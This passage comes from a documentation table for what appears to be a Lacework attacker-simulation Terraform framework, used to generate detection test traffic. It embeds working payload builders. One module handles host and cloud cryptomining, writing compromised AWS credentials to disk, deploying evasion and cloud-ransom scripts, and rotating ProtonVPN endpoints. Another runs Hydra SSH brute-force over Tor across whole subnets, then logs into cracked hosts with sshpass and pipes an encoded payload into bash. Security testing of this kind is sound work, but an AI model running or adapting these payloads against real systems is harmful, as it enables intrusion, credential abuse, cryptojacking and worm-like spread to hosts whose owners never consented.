&lt;&lt;\-EOT<br/>        log &quot;Checking for docker\.\.\.&quot;<br/>        while \! command \-v docker &gt; /dev/null \|\| \! docker ps &gt; /dev/null; do<br/>            log &quot;docker not found or not ready \- waiting&quot;<br/>            sleep 120<br/>        done<br/>        log &quot;docker path: $\(command \-v  docker\)&quot;<br/>        EOT<br/>        yum\_packages = &quot;&quot;<br/>        yum\_post\_tasks = &quot;&quot;<br/>        script\_delay\_secs = 30<br/>        next\_stage\_payload = local\.payload<br/>    \}\}\)<br/><br/>    outputs = \{<br/>        base64\_payload = base64gzip\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload = base64encode\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload\_additional = \[<br/>            \{<br/>                name = &quot;$\{basename\(abspath\(path\.module\)\)\}\_discovery\.sh&quot;<br/>                content = base64encode\(local\.discovery\)<br/>            \},<br/>            \{<br/>                name = &quot;$\{basename\(abspath\(path\.module\)\)\}\_start\.sh&quot;<br/>                content = base64encode\(local\.start\)<br/>            \}<br/>        \]<br/>    \}<br/>\}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   |
| attacker-simulation-attacker-exec-docker-composite-host-cryptomining       | ./modules/ssm/execute-docker-composite-host-cryptomining       | ssm_exec_docker_host_cryptomining          | context.aws.ssm.attacker.execute.docker_composite_host_cryptomining       | <pre>{<br/>    "context": {<br/>        "aws": {<br/>            "ssm": {<br/>                "attacker": {<br/>                    "execute": {<br/>                        "docker_composite_host_cryptomining": {<br/>                            "attack_delay": 50400,<br/>                            "compromised_credentials": {},<br/>                            "compromised_keys_user": null,<br/>                            "enabled": false,<br/>                            "minergate_user": null,<br/>                            "nicehash_user": null,<br/>                            "protonvpn_password": null,<br/>                            "protonvpn_privatekey": null,<br/>                            "protonvpn_protocol": "udp",<br/>                            "protonvpn_server": "RANDOM",<br/>                            "protonvpn_tier": 0,<br/>                            "protonvpn_user": null,<br/>                            "wallet": null<br/>                        }<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/execute-docker-composite-host-cryptomining       | <pre>locals \{<br/>    attack\_dir = &quot;/cloud\-tunnel&quot;<br/>    script = &quot;hostcrypto&quot;<br/>    script\_type = &quot;terraform&quot;<br/>    attack\_type = &quot;host\_cryptomining&quot;<br/>    aws\_creds = join\(&quot;\\n&quot;, \[ for u,k in var\.inputs\[&quot;compromised\_credentials&quot;\]: &quot;echo &\#x27;$\{k\.rendered\}&\#x27; &gt; $\{local\.attack\_dir\}/\.env\-aws\-$\{u\}&quot; \]\)<br/>    payload = &lt;&lt;\-EOT<br/>    rm \-rf $\{local\.attack\_dir\}<br/>    mkdir \-p $\{local\.attack\_dir\} $\{local\.attack\_dir\}/aws\-cli/scripts $\{local\.attack\_dir\}/terraform/scripts/cloudcrypto $\{local\.attack\_dir\}/terraform/scripts/hostcrypto $\{local\.attack\_dir\}/protonvpn<br/>    cd $\{local\.attack\_dir\}<br/>    $\{local\.aws\_creds\}<br/>    echo &\#x27;$\{base64gzip\(local\.start\)\}&\#x27; \| base64 \-d \| gunzip &gt; /$\{local\.attack\_dir\}/start\.sh<br/>    echo &\#x27;$\{base64gzip\(local\.auto\-free\)\}&\#x27; \| base64 \-d \| gunzip &gt; /$\{local\.attack\_dir\}/auto\-free\.sh<br/>    echo &\#x27;$\{base64gzip\(local\.auto\-paid\)\}&\#x27; \| base64 \-d \| gunzip &gt; /$\{local\.attack\_dir\}/auto\-paid\.sh<br/>    echo &\#x27;$\{base64gzip\(local\.protonvpn\)\}&\#x27; \| base64 \-d \| gunzip &gt; /$\{local\.attack\_dir\}/\.env\-protonvpn<br/>    echo &\#x27;$\{base64gzip\(local\.protonvpn\-paid\)\}&\#x27; \| base64 \-d \| gunzip &gt; /$\{local\.attack\_dir\}/\.env\-protonvpn\-paid<br/>    echo &\#x27;$\{base64gzip\(local\.protonvpn\-baseline\)\}&\#x27; \| base64 \-d \| gunzip &gt; /$\{local\.attack\_dir\}/\.env\-protonvpn\-baseline<br/>    echo &\#x27;$\{base64gzip\(local\.baseline\)\}&\#x27; \| base64 \-d \| gunzip &gt; /$\{local\.attack\_dir\}/aws\-cli/scripts/baseline\.sh<br/>    echo &\#x27;$\{base64gzip\(local\.discovery\)\}&\#x27; \| base64 \-d \| gunzip &gt; /$\{local\.attack\_dir\}/aws\-cli/scripts/discovery\.sh<br/>    echo &\#x27;$\{base64gzip\(local\.evasion\)\}&\#x27; \| base64 \-d \| gunzip &gt; /$\{local\.attack\_dir\}/aws\-cli/scripts/evasion\.sh<br/>    echo &\#x27;$\{base64gzip\(local\.cloudransom\)\}&\#x27; \| base64 \-d \| gunzip &gt; /$\{local\.attack\_dir\}/aws\-cli/scripts/cloudransom\.sh<br/>    echo &\#x27;$\{base64gzip\(local\.cloudcrypto\)\}&\#x27; \| base64 \-d \| gunzip &gt; /$\{local\.attack\_dir\}/terraform/scripts/cloudcrypto/main\.tf<br/>    echo &\#x27;$\{base64gzip\(local\.terraform\)\}&\#x27; \| base64 \-d \| gunzip &gt; /$\{local\.attack\_dir\}/terraform/scripts/cloudcrypto/terraform\.sh<br/>    echo &\#x27;$\{base64gzip\(local\.hostcrypto\)\}&\#x27; \| base64 \-d \| gunzip &gt; /$\{local\.attack\_dir\}/terraform/scripts/hostcrypto/main\.tf<br/>    echo &\#x27;$\{base64gzip\(local\.terraform\)\}&\#x27; \| base64 \-d \| gunzip &gt; /$\{local\.attack\_dir\}/terraform/scripts/hostcrypto/terraform\.sh<br/>    log &quot;Starting as background job\.\.\.&quot;<br/>    if \[ &quot;$\{var\.inputs\[&quot;protonvpn\_tier&quot;\]\}&quot; == &quot;0&quot; \]; then<br/>        for i in $\(echo &quot;US NL\-FREE\#1 JP\-FREE\#3 NL\-FREE\#4 NL\-FREE\#8 US\-FREE\#5 NL\-FREE\#9 NL\-FREE\#12 NL\-FREE\#13 NL\-FREE\#14 NL\-FREE\#15 NL\-FREE\#16 US\-FREE\#13 US\-FREE\#32 US\-FREE\#33 US\-FREE\#34 NL\-FREE\#39 NL\-FREE\#52 NL\-FREE\#57 NL\-FREE\#87 NL\-FREE\#133 NL\-FREE\#136 NL\-FREE\#148 US\-FREE\#52 US\-FREE\#53 US\-FREE\#54 US\-FREE\#51 NL\-FREE\#163 NL\-FREE\#164 US\-FREE\#58 US\-FREE\#57 US\-FREE\#56 US\-FREE\#55&quot;\); do cp \.env\-protonvpn \.env\-protonvpn\-$i; sed \-i &quot;s/RANDOM/$i/&quot; \.env\-protonvpn\-$i; done<br/>        bash auto\-free\.sh<br/>    else<br/>        for i in $\(echo &quot;AU CR IS JP LV NL NZ SG SK US&quot;\); do cp \.env\-protonvpn\-paid \.env\-protonvpn\-paid\-$i; sed \-i &quot;s/RANDOM/$i/&quot; \.env\-protonvpn\-paid\-$i; done<br/>        bash auto\-paid\.sh<br/>    fi;<br/>    log &quot;Done\.&quot;<br/>    EOT<br/><br/>    protonvpn       = templatefile\(<br/>                                &quot;$\{abspath\(path\.root\)\}/modules/deployment/common/payloads/linux/modules/resources/protonvpn\.env\.tpl&quot;, <br/>                                \{<br/>                                    protonvpn\_user = var\.inputs\[&quot;protonvpn\_user&quot;\]<br/>                                    protonvpn\_password = var\.inputs\[&quot;protonvpn\_password&quot;\]<br/>                                    protonvpn\_server = var\.inputs\[&quot;protonvpn\_server&quot;\]<br/>                                    protonvpn\_tier = tostring\(var\.inputs\[&quot;protonvpn\_tier&quot;\]\)<br/>                                    protonvpn\_protocol = var\.inputs\[&quot;protonvpn\_protocol&quot;\]<br/>                                    protonvpn\_privatekey = try\(length\(var\.inputs\[&quot;protonvpn\_privatekey&quot;\]\), &quot;false&quot;\) \!= &quot;false&quot; ? var\.inputs\[&quot;protonvpn\_privatekey&quot;\] : &quot;&quot;<br/>                                \}<br/>                            \)<br/>    protonvpn\-paid       = templatefile\(<br/>                                &quot;$\{abspath\(path\.root\)\}/modules/deployment/common/payloads/linux/modules/resources/protonvpn\.env\.tpl&quot;, <br/>                                \{<br/>                                    protonvpn\_user = var\.inputs\[&quot;protonvpn\_user&quot;\]<br/>                                    protonvpn\_password = var\.inputs\[&quot;protonvpn\_password&quot;\]<br/>                                    protonvpn\_server = var\.inputs\[&quot;protonvpn\_server&quot;\]<br/>                                    protonvpn\_tier = 2<br/>                                    protonvpn\_protocol = var\.inputs\[&quot;protonvpn\_protocol&quot;\]<br/>                                    protonvpn\_privatekey = try\(length\(var\.inputs\[&quot;protonvpn\_privatekey&quot;\]\), &quot;false&quot;\) \!= &quot;false&quot; ? var\.inputs\[&quot;protonvpn\_privatekey&quot;\] : &quot;&quot;<br/>                                \}<br/>                            \)<br/>    protonvpn\-baseline  = templatefile\(<br/>                                &quot;$\{abspath\(path\.root\)\}/modules/deployment/common/payloads/linux/modules/resources/protonvpn\.env\.tpl&quot;, <br/>                                \{<br/>                                    protonvpn\_user = var\.inputs\[&quot;protonvpn\_user&quot;\]<br/>                                    protonvpn\_password = var\.inputs\[&quot;protonvpn\_password&quot;\]<br/>                                    protonvpn\_server = &quot;US&quot;<br/>                                    protonvpn\_tier = tostring\(var\.inputs\[&quot;protonvpn\_tier&quot;\]\)<br/>                                    protonvpn\_protocol = var\.inputs\[&quot;protonvpn\_protocol&quot;\]<br/>                                    protonvpn\_privatekey = try\(length\(var\.inputs\[&quot;protonvpn\_privatekey&quot;\]\), &quot;false&quot;\) \!= &quot;false&quot; ? var\.inputs\[&quot;protonvpn\_privatekey&quot;\] : &quot;&quot;<br/>                                \}<br/>                            \)<br/>    auto\-free   = templatefile\(<br/>                                &quot;$\{abspath\(path\.root\)\}/modules/deployment/common/payloads/linux/modules/resources/auto\-free\.sh\.tpl&quot;,<br/>                                \{<br/>                                    compromised\_keys\_user = var\.inputs\[&quot;compromised\_keys\_user&quot;\]<br/>                                    script = local\.script<br/>                                    script\_type = local\.script\_type<br/>                                    attack\_type = local\.attack\_type<br/>                                    attack\_delay = var\.inputs\[&quot;attack\_delay&quot;\]<br/>                                \}<br/>                            \)<br/>    auto\-paid   = templatefile\(<br/>                                &quot;$\{abspath\(path\.root\)\}/modules/deployment/common/payloads/linux/modules/resources/auto\-paid\.sh\.tpl&quot;,<br/>                                \{<br/>                                    compromised\_keys\_user = var\.inputs\[&quot;compromised\_keys\_user&quot;\]<br/>                                    script = local\.script<br/>                                    script\_type = local\.script\_type<br/>                                    attack\_type = local\.attack\_type<br/>                                    attack\_delay = var\.inputs\[&quot;attack\_delay&quot;\]<br/>                                \}<br/>                            \)<br/>    baseline    = templatefile\(<br/>                                &quot;$\{abspath\(path\.root\)\}/modules/deployment/common/payloads/linux/modules/resources/baseline\.sh\.tpl&quot;,<br/>                                \{<br/>                                    attack\_type = local\.attack\_type<br/>                                \}<br/>                            \)<br/>    discovery   = templatefile\(<br/>                                &quot;$\{abspath\(path\.root\)\}/modules/deployment/common/payloads/linux/modules/resources/discovery\.sh\.tpl&quot;,<br/>                                \{<br/>                                    attack\_type = local\.attack\_type<br/>                                \}<br/>                            \)<br/>    evasion     = templatefile\(<br/>                                &quot;$\{abspath\(path\.root\)\}/modules/deployment/common/payloads/linux/modules/resources/evasion\.sh\.tpl&quot;,<br/>                                \{<br/>                                    attack\_type = local\.attack\_type<br/>                                \}<br/>                            \)<br/>    cloudransom = templatefile\(<br/>                                &quot;$\{abspath\(path\.root\)\}/modules/deployment/common/payloads/linux/modules/resources/cloudransom\.sh\.tpl&quot;,<br/>                                \{<br/>                                    attack\_type = local\.attack\_type<br/>                                \}<br/>                            \)<br/>    cloudcrypto = templatefile\(<br/>                                &quot;$\{abspath\(path\.root\)\}/modules/deployment/common/payloads/linux/modules/resources/cloudcrypto\.tf\.tpl&quot;,<br/>                                \{<br/>                                    name = &quot;crypto\-gpu\-miner\-$\{var\.inputs\[&quot;environment&quot;\]\}\-$\{var\.inputs\[&quot;deployment&quot;\]\}&quot;<br/>                                    instances = 12<br/>                                    wallet = var\.inputs\[&quot;ethermine\_wallet&quot;\]<br/>                                    region = var\.inputs\[&quot;region&quot;\]<br/>                                \}<br/>                            \)<br/>    hostcrypto  = templatefile\(<br/>                                &quot;$\{abspath\(path\.root\)\}/modules/deployment/common/payloads/linux/modules/resources/hostcrypto\.tf\.tpl&quot;,<br/>                                \{<br/>                                    name = &quot;host\-cpu\-miner\-$\{var\.inputs\[&quot;environment&quot;\]\}\-$\{var\.inputs\[&quot;deployment&quot;\]\}&quot;<br/>                                    region = var\.inputs\[&quot;region&quot;\]<br/>                                    instances = 1<br/>                                    minergate\_user = var\.inputs\[&quot;minergate\_user&quot;\]<br/>                                    nicehash\_user = var\.inputs\[&quot;nicehash\_user&quot;\]<br/>                                \}<br/>                            \)<br/>    <br/>    terraform  = templatefile\(<br/>                                &quot;$\{abspath\(path\.root\)\}/modules/deployment/common/payloads/linux/modules/resources/terraform\.sh\.tpl&quot;,<br/>                                \{<br/>                                \}<br/>                            \)<br/>    <br/>    start       = templatefile\(<br/>                                &quot;$\{abspath\(path\.root\)\}/modules/deployment/common/payloads/linux/modules/resources/start\.sh\.tpl&quot;,<br/>                                \{<br/>                                    attack\_type = local\.attack\_type<br/>                                \}<br/>                            \)<br/><br/>    base64\_payload = templatefile\(&quot;$\{path\.module\}/\.\./\.\./delayed\_start\.sh&quot;, \{ config = \{<br/>        script\_name = var\.inputs\[&quot;tag&quot;\]<br/>        log\_rotation\_count = 2<br/>        apt\_pre\_tasks = &lt;&lt;\-EOT<br/>        log &quot;Checking for docker\.\.\.&quot;<br/>        while \! command \-v docker &gt; /dev/null \|\| \! docker ps &gt; /dev/null; do<br/>            log &quot;docker not found or not ready \- waiting&quot;<br/>            sleep 120<br/>        done<br/>        log &quot;docker path: $\(command \-v  docker\)&quot;<br/>        EOT<br/>        apt\_packages = &quot;&quot;<br/>        apt\_post\_tasks = &quot;&quot;<br/>        yum\_pre\_tasks =  &lt;&lt;\-EOT<br/>        log &quot;Checking for docker\.\.\.&quot;<br/>        while \! command \-v docker &gt; /dev/null \|\| \! docker ps &gt; /dev/null; do<br/>            log &quot;docker not found or not ready \- waiting&quot;<br/>            sleep 120<br/>        done<br/>        log &quot;docker path: $\(command \-v  docker\)&quot;<br/>        EOT<br/>        yum\_packages = &quot;&quot;<br/>        yum\_post\_tasks = &quot;&quot;<br/>        script\_delay\_secs = 30<br/>        next\_stage\_payload = local\.payload<br/>    \}\}\)<br/><br/>    outputs = \{<br/>        base64\_payload = base64gzip\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload = base64encode\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload\_additional = \[<br/>            \{<br/>                name = &quot;$\{basename\(abspath\(path\.module\)\)\}\_auto\-free\.sh&quot;<br/>                content = base64encode\(local\.auto\-free\)<br/>            \},<br/>            \{<br/>                name = &quot;$\{basename\(abspath\(path\.module\)\)\}\_auto\-paid\.sh&quot;<br/>                content = base64encode\(local\.auto\-paid\)<br/>            \},<br/>            \{<br/>                name = &quot;$\{basename\(abspath\(path\.module\)\)\}\_baseline\.sh&quot;<br/>                content = base64encode\(local\.baseline\)<br/>            \},<br/>            \{<br/>                name = &quot;$\{basename\(abspath\(path\.module\)\)\}\_discovery\.sh&quot;<br/>                content = base64encode\(local\.discovery\)<br/>            \},<br/>            \{<br/>                name = &quot;$\{basename\(abspath\(path\.module\)\)\}\_evasion\.sh&quot;<br/>                content = base64encode\(local\.evasion\)<br/>            \},<br/>            \{<br/>                name = &quot;$\{basename\(abspath\(path\.module\)\)\}\_cloudransom\.sh&quot;<br/>                content = base64encode\(local\.cloudransom\)<br/>            \},<br/>            \{<br/>                name = &quot;$\{basename\(abspath\(path\.module\)\)\}\_terraform\.sh&quot;<br/>                content = base64encode\(local\.terraform\)<br/>            \},<br/>            \{<br/>                name = &quot;$\{basename\(abspath\(path\.module\)\)\}\_start\.sh&quot;<br/>                content = base64encode\(local\.start\)<br/>            \}<br/>        \]<br/>    \}<br/>\}</pre>                       |
| attacker-ssm-execute-docker-hydra                                          | ./modules/ssm/execute-docker-hydra                             | ssm_exec_docker_hydra_attacker             | context.aws.ssm.attacker.execute.docker_hydra                             | <pre>{<br/>    "context": {<br/>        "aws": {<br/>            "ssm": {<br/>                "attacker": {<br/>                    "execute": {<br/>                        "docker_hydra": {<br/>                            "attack_delay": 50400,<br/>                            "custom_password_list": [],<br/>                            "custom_user_list": [],<br/>                            "enabled": false,<br/>                            "password_list": "/opt/passwords/darkweb2017-top10.txt",<br/>                            "scan_local_network": false,<br/>                            "targets": [],<br/>                            "use_tor": true,<br/>                            "user_list": "/opt/usernames/top-usernames-shortlist.txt"<br/>                        }<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/execute-docker-hydra                             | <pre>locals \{<br/>    attack\_dir = &quot;/hydra&quot;<br/>    targets = flatten\(\[ for target in var\.inputs\[&quot;targets&quot;\]: can\(split\(&quot;/&quot;, target\)\[1\]\) ? <br/>        \[ for host\_number in range\(pow\(2, 32 \- split\(&quot;/&quot;, target\)\[1\]\)\) : cidrhost\(target, host\_number\) \]<br/>        :<br/>        \[ target \]<br/>    \]\)<br/>    base64\_command\_payload = var\.inputs\[&quot;payload&quot;\]<br/>    payload = &lt;&lt;\-EOT<br/>    \# Function to convert IP address to decimal<br/>    ip\_to\_dec\(\) \{<br/>        local IFS=\.<br/>        read ip1 ip2 ip3 ip4 &lt;&lt;&lt; &quot;$1&quot;<br/>        echo &quot;$\(\(ip1 \* 16777216 \+ ip2 \* 65536 \+ ip3 \* 256 \+ ip4\)\)&quot;<br/>    \}<br/><br/>    \# Function to convert decimal to IP address<br/>    dec\_to\_ip\(\) \{<br/>        local ip dec=$1<br/>        for e in \{3\.\.0\}; do<br/>            \(\(octet = dec / \(256 \*\* e\) \)\)<br/>            \(\(dec \-= octet \* 256 \*\* e\)\)<br/>            ip\+=&quot;$$\{octet\}\.&quot;<br/>        done<br/>        echo &quot;$$\{ip%?\}&quot;<br/>    \}<br/><br/>    \# Main function to generate IP list from CIDR<br/>    generate\_ips\(\) \{<br/>        local cidr=&quot;$1&quot;<br/>        local ip=&quot;$$\{cidr%/\*\}&quot;<br/>        local prefix=&quot;$$\{cidr\#\*/\}&quot;<br/>        local netmask=$\(\(0xffffffff ^ \(\(1 &lt;&lt; \(32 \- prefix\)\) \- 1\)\)\)<br/><br/>        local start=$\(ip\_to\_dec &quot;$ip&quot;\)<br/>        local start=$\(\(start &amp; netmask\)\)<br/>        local end=$\(\(start \| \(\(1 &lt;&lt; \(32 \- prefix\)\) \- 1\)\)\)<br/><br/>        for \(\(ip= start; ip &lt;= end; ip\+\+\)\); do<br/>            dec\_to\_ip &quot;$ip&quot;<br/>        done<br/>    \}<br/><br/>    log &quot;cleaning app directory&quot;<br/>    rm \-rf $\{local\.attack\_dir\}<br/>    mkdir \-p $\{local\.attack\_dir\}<br/>    cd $\{local\.attack\_dir\}<br/>    START\_HASH=$\(sha256sum \-\-text /tmp/payload\_$SCRIPTNAME \| awk &\#x27;\{ print $1 \}&\#x27;\)<br/>    while true; do<br/>        log &quot;starting script\.\.\.&quot;<br/>        LOCAL\_NET=$\(ip \-o \-f inet addr show \| awk &\#x27;/scope global/ \{print $4\}&\#x27; \| head \-1\)<br/>        log &quot;LOCAL\_NET: $LOCAL\_NET&quot;<br/>        log &quot;Targets: $\{join\(&quot;,&quot;, local\.targets\)\}&quot;<br/>        echo &quot;$\{ length\(local\.targets\) &gt; 0 ? join\(&quot;\\n&quot;, local\.targets\) : &quot;$\(generate\_ips $LOCAL\_NET\)&quot; \}&quot; &gt; /tmp/hydra\-targets\.txt<br/>        cat &gt; /tmp/hydra\-users\.txt &lt;&lt;&\#x27;EOF&\#x27;<br/>    $\{try\(length\(var\.inputs\[&quot;ssh\_user&quot;\]\.username\),&quot;false&quot;\) \!= &quot;false&quot; ? var\.inputs\[&quot;ssh\_user&quot;\]\.username : &quot;root&quot; \}<br/>    EOF<br/>        cat &gt; /tmp/hydra\-passwords\.txt &lt;&lt;&\#x27;EOF&\#x27;<br/>    123456<br/>    123456789<br/>    111111<br/>    password<br/>    qwerty<br/>    abc123<br/>    12345678<br/>    password1<br/>    1234567<br/>    123123<br/>    $\{try\(length\(var\.inputs\[&quot;ssh\_user&quot;\]\.password\),&quot;false&quot;\) \!= &quot;false&quot; ? var\.inputs\[&quot;ssh\_user&quot;\]\.password : &quot;&quot; \}<br/>    EOF<br/>        if sudo docker ps \-a \| grep $\{var\.inputs\[&quot;container\_name&quot;\]\}; then <br/>        sudo docker stop $\{var\.inputs\[&quot;container\_name&quot;\]\}<br/>        sudo docker rm $\{var\.inputs\[&quot;container\_name&quot;\]\}<br/>        fi<br/>        truncate \-s 0 /tmp/hydra\-found\.txt<br/>        $\{ var\.inputs\[&quot;use\_tor&quot;\] == true ? &lt;&lt;\-EOF<br/>        log &quot;Using tor network\.\.\.&quot;<br/>        if \! docker ps \| grep torproxy &gt; /dev/null; then<br/>        sudo docker run \-d \-\-rm \-\-name torproxy \-p 9050:9050 dperson/torproxy<br/>        fi<br/>        TORPROXY=$\(docker inspect \-f &\#x27;\{\{range \.NetworkSettings\.Networks\}\}\{\{\.IPAddress\}\}\{\{end\}\}&\#x27; torproxy\)<br/>        log &quot;Running: proxychains hydra \-V \-L $\{var\.inputs\[&quot;user\_list&quot;\]\} \-P $\{var\.inputs\[&quot;password\_list&quot;\]\} \-M /tmp/hydra\-targets\.txt \-dvV \-t 4 \-u \-w 10 ssh&quot;<br/>        sudo /bin/bash \-c &quot;docker run \-v /tmp:/tmp \-e TORPROXY=$TORPROXY \-\-name $\{var\.inputs\[&quot;container\_name&quot;\]\} $\{var\.inputs\[&quot;image&quot;\]\} hydra \-V \-L $\{var\.inputs\[&quot;user\_list&quot;\]\} \-P $\{var\.inputs\[&quot;password\_list&quot;\]\} \-o /tmp/hydra\-found\.txt \-M /tmp/hydra\-targets\.txt \-dvV \-t 4 \-u \-w 10 ssh \|\| true&quot;<br/>        sudo /bin/bash \-c &quot;docker logs $\{var\.inputs\[&quot;container\_name&quot;\]\} &gt;&gt; $LOGFILE 2&gt;&amp;1&quot;<br/>        sudo /bin/bash \-c &quot;docker rm $\{var\.inputs\[&quot;container\_name&quot;\]\}&quot;<br/>        log &quot;Running: proxychains hydra \-V \-L /tmp/hydra\-users\.txt \-P /tmp/hydra\-passwords\.txt \-M /tmp/hydra\-targets\.txt \-dvV \-t 4 \-u \-w 10 ssh&quot;<br/>        sudo /bin/bash \-c &quot;docker run \-v /tmp:/tmp \-e TORPROXY=$TORPROXY \-\-name $\{var\.inputs\[&quot;container\_name&quot;\]\} $\{var\.inputs\[&quot;image&quot;\]\} hydra \-V \-L /tmp/hydra\-users\.txt \-P /tmp/hydra\-passwords\.txt \-o /tmp/hydra\-found\.txt \-M /tmp/hydra\-targets\.txt \-dvV \-t 4 \-u \-w 10 ssh \|\| true&quot;<br/>        sudo /bin/bash \-c &quot;docker logs $\{var\.inputs\[&quot;container\_name&quot;\]\} &gt;&gt; $LOGFILE 2&gt;&amp;1&quot;<br/>        sudo /bin/bash \-c &quot;docker rm $\{var\.inputs\[&quot;container\_name&quot;\]\}&quot;<br/>        EOF<br/>        : &lt;&lt;\-EOF<br/>        log &quot;Running: hydra \-V \-L $\{var\.inputs\[&quot;user\_list&quot;\]\} \-P $\{var\.inputs\[&quot;password\_list&quot;\]\} \-M /tmp/hydra\-targets\.txt \-dvV \-t 4 \-u \-w 10 ssh&quot;<br/>        sudo /bin/bash \-c &quot;docker run \-v /tmp:/tmp \-\-entrypoint=hydra \-\-name $\{var\.inputs\[&quot;container\_name&quot;\]\} $\{var\.inputs\[&quot;image&quot;\]\} \-V \-L $\{var\.inputs\[&quot;user\_list&quot;\]\} \-P $\{var\.inputs\[&quot;password\_list&quot;\]\} \-o /tmp/hydra\-found\.txt \-M /tmp/hydra\-targets\.txt \-dvV \-t 4 \-u \-w 10 ssh \|\| true&quot;<br/>        sudo /bin/bash \-c &quot;docker logs $\{var\.inputs\[&quot;container\_name&quot;\]\} &gt;&gt; $LOGFILE 2&gt;&amp;1&quot;<br/>        sudo /bin/bash \-c &quot;docker rm $\{var\.inputs\[&quot;container\_name&quot;\]\}&quot;<br/>        log &quot;Running: hydra \-V \-L /tmp/hydra\-users\.txt \-P /tmp/hydra\-passwords\.txt \-M /tmp/hydra\-targets\.txt \-dvV \-t 4 \-u \-w 10 ssh&quot;<br/>        sudo /bin/bash \-c &quot;docker run \-v /tmp:/tmp \-\-entrypoint=hydra \-\-name $\{var\.inputs\[&quot;container\_name&quot;\]\} $\{var\.inputs\[&quot;image&quot;\]\} \-V \-L /tmp/hydra\-users\.txt \-P /tmp/hydra\-passwords\.txt \-o /tmp/hydra\-found\.txt \-M /tmp/hydra\-targets\.txt \-dvV \-t 4 \-u \-w 10 ssh \|\| true&quot;<br/>        sudo /bin/bash \-c &quot;docker logs $\{var\.inputs\[&quot;container\_name&quot;\]\} &gt;&gt; $LOGFILE 2&gt;&amp;1&quot;<br/>        sudo /bin/bash \-c &quot;docker rm $\{var\.inputs\[&quot;container\_name&quot;\]\}&quot;<br/>        EOF<br/>        \}<br/>        \# Read Hydra output file line by line<br/>        while IFS= read \-r line; do<br/>            \# Parse Hydra output<br/>            host=$\(echo &quot;$line&quot; \| awk &\#x27;\{print $3\}&\#x27;\)<br/>            username=$\(echo &quot;$line&quot; \| awk &\#x27;\{print $5\}&\#x27;\)<br/>            password=$\(echo &quot;$line&quot; \| awk &\#x27;\{print $7\}&\#x27;\)<br/>            log &quot;Attempting to execute payload: sshpass \-p \\&quot;$password\\&quot; ssh \-o StrictHostKeyChecking=no \\&quot;$username\\&quot;@\\&quot;$host\\&quot; &\#x27;echo $\{base64gzip\(local\.base64\_command\_payload\)\} \| base64 \-d \| gunzip \| /bin/bash&quot;<br/>            sshpass \-p &quot;$password&quot; ssh \-o StrictHostKeyChecking=no &quot;$username&quot;@&quot;$host&quot; &\#x27;echo $\{base64gzip\(local\.base64\_command\_payload\)\} \| base64 \-d \| gunzip \| /bin/bash&\#x27;<br/>            log &quot;Done&quot;<br/>        done &lt; &lt;\(grep \-v &quot;^\#&quot; /tmp/hydra\-found\.txt \| sort \| uniq\)<br/>        log &quot;Done\.&quot;<br/><br/>        log &\#x27;waiting 30 minutes\.\.\.&\#x27;;<br/>        sleep 1800<br/>        if \! check\_payload\_update /tmp/payload\_$SCRIPTNAME $START\_HASH; then<br/>            log &quot;payload update detected \- exiting loop and forcing payload download&quot;<br/>            rm \-f /tmp/payload\_$SCRIPTNAME<br/>            break<br/>        else<br/>            log &quot;restarting loop\.\.\.&quot;<br/>            log &quot;waiting $\{var\.inputs\[&quot;attack\_delay&quot;\]\} seconds\.\.\.&quot;;<br/>            sleep $\{var\.inputs\[&quot;attack\_delay&quot;\]\}<br/>        fi<br/>    done<br/>    log &quot;Done\.&quot;<br/>    EOT<br/><br/>    base64\_payload = templatefile\(&quot;$\{path\.module\}/\.\./\.\./delayed\_start\.sh&quot;, \{ config = \{<br/>        script\_name = var\.inputs\[&quot;tag&quot;\]<br/>        log\_rotation\_count = 2<br/>        apt\_pre\_tasks = &lt;&lt;\-EOT<br/>        log &quot;Checking for docker\.\.\.&quot;<br/>        while \! command \-v docker &gt; /dev/null \|\| \! docker ps &gt; /dev/null; do<br/>            log &quot;docker not found or not ready \- waiting&quot;<br/>            sleep 120<br/>        done<br/>        log &quot;docker path: $\(command \-v  docker\)&quot;<br/>        EOT<br/>        apt\_packages = &quot;sshpass jq&quot;<br/>        apt\_post\_tasks = &quot;&quot;<br/>        yum\_pre\_tasks =  &lt;&lt;\-EOT<br/>        log &quot;Checking for docker\.\.\.&quot;<br/>        while \! command \-v docker &gt; /dev/null \|\| \! docker ps &gt; /dev/null; do<br/>            log &quot;docker not found or not ready \- waiting&quot;<br/>            sleep 120<br/>        done<br/>        log 